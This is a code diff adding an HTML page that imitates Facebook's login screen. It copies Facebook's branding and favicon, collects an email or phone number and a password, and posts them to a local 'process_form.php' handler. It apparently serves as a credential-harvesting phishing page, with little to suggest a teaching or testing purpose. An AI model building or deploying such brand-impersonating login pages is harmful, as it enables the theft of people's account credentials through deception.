@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 50px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-form input, .login-form button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .login-form input.invalid {
+      border-color: red;
+    }
+
+    .login-form button {
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
+
+    .login-form button:hover {
+      background-color: #0e63b3;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #1877f2;
+    }
+
+    .create-account {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .create-account a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <!-- Insert Facebook logo here -->
+      <img src="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" alt="Facebook Logo" width="48" height="48">
+    </div>
+    <form id="login-form" class="login-form" action="process_form.php" method="post">
+      <input type="text" name="email_or_phone" id="email_or_phone" placeholder="Email or Phone" required>
+      <input type="password" name="password" id="password" placeholder="Password" required>
+      <button type="button" onclick="validateForm()">Log In</button>
+      <div class="forgot-password">Forgot Password?</div>
+    </form>
+    <div class="create-account">
+      <a href="#">Create New Account</a>
+    </div>
+  </div>
+
+  <script>
+    function validateForm() {
+      var emailOrPhone = document.getElementById("email_or_phone");
+      var password = document.getElementById("password");
+      
+      if (emailOrPhone.value.trim() === '') {
+        emailOrPhone.classList.add("invalid");
+      } else {
+        emailOrPhone.classList.remove("invalid");
+      }
+      
+      if (password.value.trim() === '') {
+        password.classList.add("invalid");
+      } else {
+        password.classList.remove("invalid");
+      }
+      
+      if (emailOrPhone.value.trim() === '' || password.value.trim() === '') {
+        // If any of the fields are empty, prevent form submission
+        return false;
+      }
+
+      // If all fields are filled, allow form submission
+      document.getElementById("login-form").submit();
+    }
+  </script>
+</body>
+</html>
